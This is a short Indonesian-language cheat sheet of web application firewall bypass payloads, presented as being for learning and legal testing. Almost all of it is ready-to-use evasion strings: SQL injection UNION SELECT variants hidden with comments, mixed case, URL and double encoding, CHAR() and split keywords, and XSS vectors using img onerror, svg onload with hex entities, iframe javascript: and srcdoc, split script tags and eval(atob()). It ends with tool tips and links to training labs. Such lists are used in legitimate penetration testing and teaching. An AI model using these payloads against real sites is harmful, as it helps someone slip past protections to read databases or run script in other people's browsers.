# SQL Injection WAF Bypass

# Disclaimer

Semua contoh berikut hanya untuk tujuan pembelajaran dan pengujian keamanan yang sah. Dilarang keras digunakan untuk aktivitas ilegal.

## Tujuan
Melewati filter WAF yang memblokir payload SQL standar.

## Contoh Payload Bypass

1. Obfuscation menggunakan komentar  
   `'/**/UNION/**/SELECT/**/1,2,3--+`

2. Case Variation  
   `' UnIoN SeLeCt 1,2,3--+`

3. URL Encoding  
   `%27%20union%20select%201,2,3--+`

4. Double Encoding  
   `%2527%2520union%2520select%25201,2,3--+`

5. String Concatenation  
   `' UNION SELECT 1,CONCAT('us','er'),3--+`

6. Menggunakan CHAR() Function  
   `' UNION SELECT 1,CHAR(117,115,101,114),3--+`

7. Tanpa Spasi (gunakan Tab atau Komentar)  
   `'union/**/select/**/1,2,3--+`

8. Komentar Inline antar Keyword  
   `'/**/UN/**/ION/**/SE/**/LECT/**/1,2,3--+`

# XSS WAF Bypass

## Tujuan
Melewati filter WAF yang memblokir tag `<script>` dan event handler seperti `onerror`, `onclick`.

## Contoh Payload Bypass

1. `<img>` Injection  
   `<img src=x onerror=alert(1)>`

2. Hex Encoding  
   `<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>`

3. Event Handler dengan Obfuscation  
   `<iframe src="javascript:alert('XSS')">`

4. Menggunakan `srcdoc` dalam `<iframe>`  
   `<iframe srcdoc="<script>alert(1)</script>">`

5. Tag `<script>` yang dipecah  
   `<scr<script>ipt>alert(1)</script>`

6. Base64 JavaScript Execution (dengan eval)  
   `<script>eval(atob("YWxlcnQoMSk="))</script>`

7. MathML (khusus Firefox)  
   `<math><mtext></mtext><script>alert(1)</script></math>`

8. Bypass dengan `<details>`  
   `<details open ontoggle=alert(1)>`

# Tips Menghadapi WAF

Uji filter karakter dengan input acak  
Gunakan tool seperti Burp Suite, SQLMap, atau XSStrike untuk eksplorasi payload lebih kompleks  
Coba pendekatan polyglot: payload yang valid di banyak konteks sekaligus

# Referensi Legal

https://portswigger.net/web-security/sql-injection/union-attacks  
https://exploit.linuxsec.org/tutorial-sql-injection-manual/  
https://exploit.linuxsec.org/payload-dump-one-shot-sql-injection/  
https://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html  
https://portswigger.net/web-security  
https://owasp.org/www-project-juice-shop  
https://tryhackme.com  
https://www.hackthebox.com
